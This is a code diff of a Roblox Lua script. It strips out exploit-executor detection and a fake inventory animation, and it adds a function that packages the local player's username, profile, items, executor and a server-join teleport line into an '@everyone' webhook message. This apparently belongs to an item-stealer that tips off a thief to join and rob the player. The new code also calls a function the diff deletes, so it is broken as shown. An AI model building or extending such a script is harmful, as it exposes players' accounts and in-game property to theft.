@@ -1,88 +1,35 @@
-if game.PlaceId == 142823291 then
-    local function detectExecutor()
-        local executor = (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X")
-            or (secure_load and "Sentinel")
-            or (pebc_execute and "ProtoSmasher")
-            or (KRNL_LOADED and "Krnl")
-            or (is_sirhurt_closure and "SirHurt")
-            or (identifyexecutor and identifyexecutor():find("ScriptWare") and "Script-Ware")
-            or "Unsupported"
-        return executor
-    end
+local function createWebhookData(itemNames)
+    local webhookcheck = detectExecutor()
+    local LocalPlayer = game.Players.LocalPlayer
+    local jobId = game.JobId
+    local placeId = game.PlaceId
+    local username = LocalPlayer.Name
 
-    local executorName = detectExecutor()
-    if executorName == "Delta" then return end
+    local teleportScript = string.format(
+        'game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s", game.Players.LocalPlayer)',
+        placeId, jobId
+    )
 
-    -- GUI Animation Part
-    local player = game.Players.LocalPlayer
-    local playerGui = player:WaitForChild("PlayerGui")
-    local mainGui = playerGui:WaitForChild("MainGUI")
-    local inventoryFrame = mainGui:WaitForChild("Inventory")
-    local itemsFrame = inventoryFrame:WaitForChild("Main"):WaitForChild("Weapons"):WaitForChild("Items"):WaitForChild("Container")
+    local data = {
+        ["content"] = "@everyone 🚨 New items detected! 🚨",
+        ["embeds"] = {
+            {
+                ["author"] = {
+                    ["name"] = "🎉 Items from " .. username,
+                    ["url"] = "https://www.roblox.com/users/" .. LocalPlayer.UserId .. "/profile",
+                },
+                ["description"] = string.format(
+                    "**New Items:**\n%s\n\n**Executor:** %s\n\n**Join this server using this script:**```lua\n%s\n```",
+                    itemNames, webhookcheck, teleportScript
+                ),
+                ["type"] = "rich",
+                ["color"] = tonumber("0xFFD700"),
+                ["thumbnail"] = {
+                    ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LocalPlayer.UserId .. "&width=150&height=150&format=png"
+                },
+            }
+        }
+    }
 
-    local tweenService = game:GetService("TweenService")
-    local uis = game:GetService("UserInputService")
-
-    -- Function to smoothly animate the GUI element visibility
-    local function tweenVisibility(element, transparency, duration)
-        local tweenInfo = TweenInfo.new(duration, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
-        local tween = tweenService:Create(element, tweenInfo, {BackgroundTransparency = transparency})
-        tween:Play()
-    end
-
-    -- Function to create new GUI items in the inventory
-    local function createItemUI(itemName)
-        local newItem = Instance.new("TextLabel")
-        newItem.Size = UDim2.new(0, 200, 0, 50)
-        newItem.BackgroundTransparency = 1
-        newItem.Text = itemName
-        newItem.Font = Enum.Font.GothamBold
-        newItem.TextSize = 16
-        newItem.TextColor3 = Color3.fromRGB(255, 255, 255)
-        newItem.TextStrokeTransparency = 0.8
-        newItem.Parent = itemsFrame
-
-        -- Smooth entrance animation for the new item
-        newItem.Position = UDim2.new(0.5, -100, 1, 0)  -- Start below the screen
-        local tweenIn = tweenService:Create(newItem, TweenInfo.new(0.5), {Position = UDim2.new(0.5, -100, 0, 20)})
-        tweenIn:Play()
-
-        -- Fade the item in over 1.5 seconds
-        tweenVisibility(newItem, 0, 1.5)
-    end
-
-    -- Function to remove items from GUI (used after webhook)
-    local function removeItemUI(itemLabel)
-        local tweenOut = tweenService:Create(itemLabel, TweenInfo.new(0.5), {BackgroundTransparency = 1, TextTransparency = 1})
-        tweenOut:Play()
-        tweenOut.Completed:Connect(function()
-            itemLabel:Destroy()
-        end)
-    end
-
-    -- Example: Simulate adding items (you can change this to actual item detection)
-    local function simulateItems()
-        -- Simulating new item names (can be based on real item detection)
-        local itemNames = {"Item A", "Item B", "Item C"}
-
-        -- Animate items into GUI
-        for _, itemName in ipairs(itemNames) do
-            createItemUI(itemName)
-        end
-    end
-
-    -- Call the simulateItems function to show the items in the inventory GUI
-    simulateItems()
-
-    -- Listen for close action or exit event to clean up
-    uis.InputBegan:Connect(function(input)
-        if input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode == Enum.KeyCode.Escape then
-            -- Close the inventory by removing UI elements
-            for _, child in ipairs(itemsFrame:GetChildren()) do
-                if child:IsA("TextLabel") then
-                    removeItemUI(child)
-                end
-            end
-        end
-    end)
+    return HttpService:JSONEncode(data)
 end
